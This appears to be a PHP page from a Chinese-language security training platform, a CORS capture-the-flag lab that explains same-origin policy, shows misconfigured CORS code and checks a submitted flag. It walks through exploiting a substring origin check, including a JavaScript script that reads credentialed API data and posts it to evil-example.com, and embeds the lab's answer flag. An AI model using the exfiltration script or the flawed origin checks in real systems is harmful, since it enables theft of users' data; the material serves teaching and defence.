<?php
session_start();
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: /account/login.php".(isset($_SERVER['REQUEST_URI'])?"?redirect=".$_SERVER['REQUEST_URI']:""));
    exit;
}

include("config.php");
if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["answer"])){
    $input_answer = $_POST["answer"];
    if($input_answer=="flag{cors_bypass_success}"){
        $user_id = $_SESSION["id"];
        $challenges_name = "CORS-Policy-1";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link,$user_id,$challenges_name);
    }else{
        $challenge_array = array('alert','答案錯誤');
    }
}
$challenge_type = isset($challenge_array[0]) ? $challenge_array[0] : '';
$challenge_messange = isset($challenge_array[1]) ? $challenge_array[1] : '';
?>

<?php
    $titlename='CORS 與同源政策 - Lab 1';
	include_once('../../php-inc/header.php');
?>

<div class="container mt-4">
    <div class="row">
        <div class="col-12">
            <div class="card">
                <div class="card-header bg-primary text-white">
                    <h1>CORS 與同源政策安全</h1>
                </div>
                <div class="card-body">
                    <div class="alert alert-info">
                        <h4>什麼是同源政策（Same-Origin Policy）？</h4>
                        <p>同源政策是一種重要的安全機制，用於限制一個來源的文件或程式碼如何與另一個來源的資源進行互動。如果兩個 URL 的協定（protocol）、主機名（host）和埠號（port）都相同，則它們被視為「同源」。</p>
                        <p>同源政策主要防止惡意網站讀取其他網站的敏感資料，是瀏覽器端安全的基石。</p>
                    </div>

                    <div class="alert alert-info">
                        <h4>什麼是 CORS（跨來源資源共用）？</h4>
                        <p>CORS（Cross-Origin Resource Sharing）是一種 HTTP 標頭機制，允許伺服器指定哪些來源可以讀取其資源。這使伺服器能夠放寬同源政策，安全地允許某些跨域請求，同時拒絕其他跨域請求。</p>
                        <p>CORS 通過一系列的 HTTP 標頭來實現，如 <code>Access-Control-Allow-Origin</code>、<code>Access-Control-Allow-Methods</code> 等。</p>
                    </div>

                    <h2>Lab 1 - CORS 設定不當與漏洞利用</h2>
                    <p>在這個實驗中，我們將展示 CORS 設定不當可能導致的安全風險，以及如何利用和防範這些風險。</p>
                    <p><strong>目標</strong>：找出並利用 CORS 設定不當的漏洞，獲取敏感資料。</p>

                    <div class="card mb-4">
                        <div class="card-header bg-secondary text-white">
                            <h3>同源政策與 CORS 基礎知識</h3>
                        </div>
                        <div class="card-body">
                            <h4>同源與非同源</h4>
                            <table class="table table-bordered">
                                <thead class="thead-dark">
                                    <tr>
                                        <th>URL 與 http://example.com/page.html 比較</th>
                                        <th>是否同源</th>
                                        <th>原因</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td>http://example.com/about.html</td>
                                        <td class="table-success">是</td>
                                        <td>相同協定、主機和埠</td>
                                    </tr>
                                    <tr>
                                        <td>https://example.com/page.html</td>
                                        <td class="table-danger">否</td>
                                        <td>協定不同（https vs http）</td>
                                    </tr>
                                    <tr>
                                        <td>http://www.example.com/page.html</td>
                                        <td class="table-danger">否</td>
                                        <td>主機不同（www.example.com vs example.com）</td>
                                    </tr>
                                    <tr>
                                        <td>http://example.com:8080/page.html</td>
                                        <td class="table-danger">否</td>
                                        <td>埠不同（8080 vs 預設的 80）</td>
                                    </tr>
                                </tbody>
                            </table>

                            <h4>常見的 CORS 標頭</h4>
                            <div class="table-responsive">
                                <table class="table table-bordered">
                                    <thead class="thead-dark">
                                        <tr>
                                            <th>標頭名稱</th>
                                            <th>描述</th>
                                            <th>範例</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr>
                                            <td><code>Access-Control-Allow-Origin</code></td>
                                            <td>指定哪些網站可以讀取資源</td>
                                            <td><code>Access-Control-Allow-Origin: https://example.com</code> 或 <code>Access-Control-Allow-Origin: *</code></td>
                                        </tr>
                                        <tr>
                                            <td><code>Access-Control-Allow-Methods</code></td>
                                            <td>指定允許的 HTTP 方法</td>
                                            <td><code>Access-Control-Allow-Methods: GET, POST, PUT</code></td>
                                        </tr>
                                        <tr>
                                            <td><code>Access-Control-Allow-Headers</code></td>
                                            <td>指定允許的 HTTP 標頭</td>
                                            <td><code>Access-Control-Allow-Headers: Content-Type, Authorization</code></td>
                                        </tr>
                                        <tr>
                                            <td><code>Access-Control-Allow-Credentials</code></td>
                                            <td>指定跨域請求是否可以包含認證資訊</td>
                                            <td><code>Access-Control-Allow-Credentials: true</code></td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-4">
                        <div class="card-header bg-info text-white">
                            <h3>CORS 漏洞示範</h3>
                        </div>
                        <div class="card-body">
                            <h4>以下是常見的 CORS 設定不當：</h4>
                            
                            <div class="alert alert-danger mb-3">
                                <h5>1. 過度放寬的 CORS 政策</h5>
                                <pre class="bg-light p-2"><code>
// PHP 設定所有源都可以存取的 CORS 政策
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header("Access-Control-Allow-Credentials: true");  // 允許帶認證資訊
                                </code></pre>
                                <p><strong>風險</strong>：允許任何網站存取資源，若允許認證（credentials）且回應包含敏感資訊，可能導致資訊洩漏。</p>
                            </div>
                            
                            <div class="alert alert-danger mb-3">
                                <h5>2. 反射型 CORS</h5>
                                <pre class="bg-light p-2"><code>
// PHP 反射 Origin 標頭（極其危險的設定）
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
header("Access-Control-Allow-Origin: " . $origin);
header("Access-Control-Allow-Credentials: true");
                                </code></pre>
                                <p><strong>風險</strong>：伺服器直接反射請求中的 Origin 標頭，允許任何網站存取資源，且可能包含認證資訊。</p>
                            </div>
                            
                            <div class="alert alert-danger mb-3">
                                <h5>3. 子域名驗證不完整</h5>
                                <pre class="bg-light p-2"><code>
// PHP 檢查子域名但檢查不完整
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if (preg_match('/example\.com$/', parse_url($origin, PHP_URL_HOST))) {
    header("Access-Control-Allow-Origin: " . $origin);
    header("Access-Control-Allow-Credentials: true");
}
                                </code></pre>
                                <p><strong>風險</strong>：攻擊者可能註冊 <code>malicious-example.com</code> 這樣的域名來繞過檢查。</p>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-4">
                        <div class="card-header bg-danger text-white">
                            <h3>實驗環節</h3>
                        </div>
                        <div class="card-body">
                            <h4>情境：易受攻擊的 API 服務</h4>
                            <p>假設有一個內部 API 服務器（<code>api.internal-example.com</code>）具有以下配置：</p>
                            
                            <pre class="bg-light p-3"><code>
// api.internal-example.com 的 CORS 設定
<?php
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
// 反射任何 Origin，但嘗試只限制 example.com 子域名
if (strpos($origin, 'example.com') !== false) {
    header("Access-Control-Allow-Origin: " . $origin);
    header("Access-Control-Allow-Credentials: true");
}

// 處理 API 請求
if (isset($_SESSION['user_id'])) {
    // 敏感資料 API 端點
    echo json_encode([
        "status" => "success",
        "user_id" => $_SESSION['user_id'],
        "api_key" => "flag{cors_bypass_success}",
        "account_balance" => 10000
    ]);
} else {
    echo json_encode(["status" => "error", "message" => "未經授權"]);
}
?>
</code></pre>

                            <div class="alert alert-warning mt-3">
                                <h5>挑戰</h5>
                                <p>攻擊者可以如何利用此 CORS 設定漏洞？思考以下問題：</p>
                                <ol>
                                    <li>源驗證有什麼問題？</li>
                                    <li>如何構造一個合法的但惡意的 Origin？</li>
                                    <li>如何撰寫 JavaScript 來利用此漏洞？</li>
                                </ol>
                            </div>

                            <div class="mt-4">
                                <h4>測試 CORS 配置</h4>
                                <p>請嘗試構造一個跨域請求模擬，驗證 CORS 漏洞：</p>
                                
                                <form id="cors-test-form" class="mb-4">
                                    <div class="form-group">
                                        <label for="origin-header"><strong>Origin 標頭：</strong></label>
                                        <input type="text" class="form-control" id="origin-header" placeholder="輸入 Origin 標頭值，例如：https://malicious-example.com">
                                    </div>
                                    <button type="button" class="btn btn-primary" onclick="simulateCORSRequest()">模擬請求</button>
                                </form>
                                
                                <div id="cors-result" class="bg-light p-3" style="display: none;">
                                    <h5>請求結果：</h5>
                                    <pre id="cors-response"></pre>
                                </div>
                                
                                <script>
                                function simulateCORSRequest() {
                                    const origin = document.getElementById('origin-header').value.trim();
                                    
                                    if (!origin) {
                                        alert('請輸入 Origin 標頭值');
                                        return;
                                    }
                                    
                                    // 模擬響應
                                    const resultDiv = document.getElementById('cors-result');
                                    const responseDiv = document.getElementById('cors-response');
                                    
                                    // 檢查 origin 是否包含 example.com
                                    if (origin.indexOf('example.com') !== -1) {
                                        responseDiv.innerHTML = `HTTP/1.1 200 OK
Access-Control-Allow-Origin: ${origin}
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
    "status": "success",
    "user_id": "12345",
    "api_key": "flag{cors_bypass_success}",
    "account_balance": 10000
}`;
                                    } else {
                                        responseDiv.innerHTML = `HTTP/1.1 200 OK
Content-Type: application/json

{
    "status": "error",
    "message": "未經授權"
}`;
                                    }
                                    
                                    resultDiv.style.display = 'block';
                                }
                                </script>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-4">
                        <div class="card-header bg-warning text-dark">
                            <h3>參考指令</h3>
                        </div>
                        <div class="card-body">
                            <h4>漏洞利用步驟</h4>
                            
                            <div class="alert alert-secondary">
                                <h5>步驟 1: 識別 CORS 漏洞</h5>
                                <p>在這個例子中，服務器使用了不安全的 Origin 驗證：</p>
                                <pre class="bg-light p-2"><code>if (strpos($origin, 'example.com') !== false) {
    header("Access-Control-Allow-Origin: " . $origin);
    header("Access-Control-Allow-Credentials: true");
}</code></pre>
                                <p>問題在於 <code>strpos($origin, 'example.com')</code> 只檢查字符串包含關係，而不是域名結構。</p>
                            </div>
                            
                            <div class="alert alert-secondary">
                                <h5>步驟 2: 構造惡意 Origin</h5>
                                <p>可以構造以下域名繞過檢查：</p>
                                <ul>
                                    <li><code>https://malicious-site.com?example.com</code></li>
                                    <li><code>https://example.com.evil.com</code></li>
                                    <li><code>https://fake-example.com</code></li>
                                </ul>
                                <p>任何包含 <code>example.com</code> 字符串的域名或 URL 都能通過檢查。</p>
                            </div>
                            
                            <div class="alert alert-secondary">
                                <h5>步驟 3: 撰寫攻擊腳本</h5>
                                <p>攻擊者可以在其控制的域名（例如 <code>evil-example.com</code>）上放置以下 JavaScript 代碼：</p>
                                <pre class="bg-light p-2"><code>// 在 evil-example.com 上的攻擊腳本
&lt;script&gt;
    // 使用 fetch API 訪問易受攻擊的 API
    fetch('https://api.internal-example.com/sensitive-data', {
        method: 'GET',
        credentials: 'include'  // 包含 cookie 等認證資訊
    })
    .then(response => response.json())
    .then(data => {
        // 將竊取的資料發送到攻擊者的伺服器
        fetch('https://evil-example.com/stolen-data', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    })
    .catch(error => console.error('Error:', error));
&lt;/script&gt;</code></pre>
                            </div>
                            
                            <div class="alert alert-secondary">
                                <h5>步驟 4: 欺騙使用者</h5>
                                <p>攻擊者只需誘使已登入 <code>api.internal-example.com</code> 的用戶訪問其惡意網站，就能竊取敏感資料。</p>
                                <p>由於 API 伺服器設置了 <code>Access-Control-Allow-Credentials: true</code>，且接受了攻擊者域名的 Origin，跨域請求將包含用戶的認證信息，從而回傳敏感資料。</p>
                            </div>
                            
                            <div class="alert alert-info">
                                <h5>正確修復方案</h5>
                                <pre class="bg-light p-2"><code>// 正確的域名驗證
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];

if (in_array($origin, $allowedOrigins)) {
    header("Access-Control-Allow-Origin: " . $origin);
    header("Access-Control-Allow-Credentials: true");
}</code></pre>
                                <p>或使用更嚴格的正規表達式檢查：</p>
                                <pre class="bg-light p-2"><code>// 更嚴格的子域名檢查
if (preg_match('/^https:\/\/([a-zA-Z0-9-]+\.)?example\.com$/', $origin)) {
    header("Access-Control-Allow-Origin: " . $origin);
    header("Access-Control-Allow-Credentials: true");
}</code></pre>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-4">
                        <div class="card-header bg-success text-white">
                            <h3>答案提交</h3>
                        </div>
                        <div class="card-body">
                            <form method="POST">
                                <div class="form-group">
                                    <label for="answer">成功利用 CORS 漏洞後，您獲得了什麼 API 密鑰（flag）？</label>
                                    <input type="text" class="form-control" placeholder="例如：flag{example_flag}" id="answer" name="answer">
                                </div>
                                <button type="submit" class="btn btn-success">提交答案</button>
                            </form>
                            
                            <?php if(isset($challenge_type) && !empty($challenge_type)): ?>
                            <div class="mt-3 alert alert-<?php echo $challenge_type == 'success' ? 'success' : 'danger'; ?>">
                                <?php echo $challenge_messange; ?>
                            </div>
                            <?php endif; ?>
                        </div>
                    </div>

                    <div class="card">
                        <div class="card-header bg-dark text-white">
                            <h3>學習更多</h3>
                        </div>
                        <div class="card-body">
                            <h4>CORS 與同源政策的最佳實踐</h4>
                            <ol>
                                <li>盡可能限制 <code>Access-Control-Allow-Origin</code> 只接受特定來源</li>
                                <li>避免使用反射型 Origin 標頭</li>
                                <li>不要在不必要時設置 <code>Access-Control-Allow-Credentials: true</code></li>
                                <li>確保敏感的 API 端點有適當的認證及授權機制</li>
                                <li>正確驗證域名，使用嚴格的比對而非簡單的字符串包含關係</li>
                                <li>考慮使用 CSRF Token 作為額外保護機制</li>
                            </ol>

                            <h4>相關資源</h4>
                            <ul>
                                <li><a href="https://developer.mozilla.org/zh-TW/docs/Web/HTTP/CORS" target="_blank">MDN Web Docs: 跨來源資源共用（CORS）</a></li>
                                <li><a href="https://developer.mozilla.org/zh-TW/docs/Web/Security/Same-origin_policy" target="_blank">MDN Web Docs: 同源政策</a></li>
                                <li><a href="https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny" target="_blank">OWASP: CORS Header 檢查</a></li>
                                <li><a href="https://portswigger.net/web-security/cors" target="_blank">PortSwigger: CORS 漏洞</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<?php
	include_once('../../php-inc/footer.php');
?>